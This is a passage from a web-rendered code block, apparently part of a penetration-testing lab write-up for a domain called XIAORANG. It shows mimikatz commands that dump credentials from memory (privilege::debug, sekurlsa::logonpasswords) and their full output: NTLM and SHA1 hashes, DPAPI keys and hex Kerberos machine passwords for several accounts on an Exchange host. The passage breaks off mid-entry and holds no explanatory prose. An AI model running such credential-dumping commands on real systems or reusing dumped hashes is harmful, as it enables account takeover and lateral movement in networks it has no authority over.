class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10598763 (00000000:00a1b96b)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 15:26:47</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : d8ab6a5ecc31f0ee092162f6b4cbbb42</span><br><span class="line"> * SHA1     : ba8a181c30dd83e3cb8c8d62315ae23163340479</span><br><span class="line"> * DPAPI    : 608ba79cc390d4c930b34bb0e2fd9c35</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10000700 (00000000:0098993c)</span><br><span class="line">Session           : RemoteInteractive from 3</span><br><span class="line">User Name         : calm</span><br><span class="line">Domain            : XIAORANG-EXC01</span><br><span class="line">Logon Server      : XIAORANG-EXC01</span><br><span class="line">Logon Time        : 2025/3/11 15:25:44</span><br><span class="line">SID               : S-1-5-21-804691931-3750513266-524628342-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * NTLM     : 6912928308e3cda903e6d75bd6091a20</span><br><span class="line"> * SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 9993321 (00000000:00987c69)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : DWM-3</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 15:25:43</span><br><span class="line">SID               : S-1-5-90-0-3</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 9993305 (00000000:00987c59)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : DWM-3</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 15:25:43</span><br><span class="line">SID               : S-1-5-90-0-3</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 2217558 (00000000:0021d656)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 14:49:24</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 2dd2fea458c9690609313e7d7c1d1094</span><br><span class="line"> * SHA1     : 710b23fb4ffb87bf98b5821e0e7a9b622e0a3283</span><br><span class="line"> * DPAPI    : 4bb9f57b64b8fb82bcaabba12708f6bb</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 108951 (00000000:0001a997)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 14:47:44</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line"> * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line"> * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 66126 (00000000:0001024e)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:43</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 9587463cfa3fd1ea760c401e2c52e224</span><br><span class="line"> * SHA1     : 162fc915ffccfa73c6f53b3c92f02690ccf7831c</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 12 ae e6 f2 22 80 c0 a3 cd 84 c9 94 de ef 96 52 79 ff ea 99 f6 9c 67 48 10 08 e7 99 1a fa 51 11 ad b6 c1 79 cc 6d 04 b2 22 01 47 b0 53 b5 7e ff df 04 21 34 ae 7b ee c9 cf b1 c1 d3 c0 63 d3 d7 6a f2 3a 38 83 ac cf d2 93 7b d3 0b bb d6 a5 8d 7c cd f1 77 65 0b 8c 77 dd 98 49 3c 21 f0 5d fc a7 8f c7 e0 5b f7 96 4d d2 46 14 81 8f 4f a7 a4 27 11 09 03 f9 f4 0d ce 71 4d 8d 64 c3 a9 6b 5c 4a 77 ba ac 33 1a 49 60 11 bd 4d b2 1e 98 05 1a c1 03 5b c6 cf 4e 1c d3 83 10 52 51 68 c4 b1 e0 65 c2 36 f3 a6 3f 66 c6 95 8c 3d 47 ab 9b cb 35 bd 53 f0 6f 13 ae 48 28 5e cf 5b ee 45 ce 7f 10 47 aa e6 f0 d3 09 c0 b3 ad ef 24 00 c5 c8 f0 7f a5 06 93 0e f5 a4 2a ec d0 25 96 4d a4 88 d3 55 94 d9 94 81 ef 8b ba 9e 89 b6 36 dc 88 64 8d 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 66047 (00000000:000101ff)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:43</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10614933 (00000000:00a1f895)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 15:27:00</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : d8ab6a5ecc31f0ee092162f6b4cbbb42</span><br><span class="line"> * SHA1     : ba8a181c30dd83e3cb8c8d62315ae23163340479</span><br><span class="line"> * DPAPI    : 608ba79cc390d4c930b34bb0e2fd9c35</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 10000729 (00000000:00989959)</span><br><span class="line">Session           : RemoteInteractive from 3</span><br><span class="line">User Name         : calm</span><br><span class="line">Domain            : XIAORANG-EXC01</span><br><span class="line">Logon Server      : XIAORANG-EXC01</span><br><span class="line">Logon Time        : 2025/3/11 15:25:44</span><br><span class="line">SID               : S-1-5-21-804691931-3750513266-524628342-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * NTLM     : 6912928308e3cda903e6d75bd6091a20</span><br><span class="line"> * SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : calm</span><br><span class="line"> * Domain   : XIAORANG-EXC01</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 995 (00000000:000003e3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IUSR</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:45</span><br><span class="line">SID               : S-1-5-17</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : XIAORANG-EXC01$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:27</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : xiaorang-exc01$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 8772690 (00000000:0085dc52)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : DefaultAppPool</span><br><span class="line">Domain            : IIS APPPOOL</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 15:19:10</span><br><span class="line">SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf 